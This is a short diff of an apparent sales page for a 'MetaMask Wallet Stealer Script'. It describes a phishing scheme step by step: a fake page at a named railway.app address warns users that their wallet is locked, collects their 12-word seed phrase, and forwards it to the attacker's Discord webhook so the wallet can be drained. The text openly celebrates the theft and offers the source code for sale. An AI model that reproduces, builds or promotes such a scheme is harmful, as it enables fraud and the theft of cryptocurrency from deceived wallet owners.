@@ -1,10 +1,10 @@
-METAMASK WALLET STEALER SCRIPT (FULL SOURCE CODE + INSTALLTION)
+<h1>METAMASK WALLET STEALER SCRIPT (FULL SOURCE CODE + INSTALLTION)</h1>
 
 Your Ultimate Crypto Hustle Tool Awaits! 🎯Ready to feast on crypto wallets? 💰 This MetaMask Wallet Stealer Script is your golden key 🪙 – a slick lure that tricks users into dropping their 12-word seed phrases like it’s nothing 🍬. No fluff, no mercy, just a razor-sharp edge that delivers 💪.
 
 How It Strikes: ⚡
 
-    The Setup 🕸️: User hits https://metamask.up.railway.app/ – a pro-grade fake page yelling “Your MetaMask is LOCKED! Suspicious activity flagged! 🔒”
+    The Setup 🕸️: User hits https://metamask.up.railway.app – a pro-grade fake page yelling “Your MetaMask is LOCKED! Suspicious activity flagged! 🔒”
     The Hook 🎣: They’re told to “verify” their account to unlock it – panic kicks in, they’re snagged 😱.
     The Grab 🐾: They type their 12 secret words, smash “Verify,” and BOOM – those words beam to your Discord via webhook 📨.
     The Win 💸: You’ve got their seed phrase, their wallet’s yours – drain it dry before they twitch 😎.
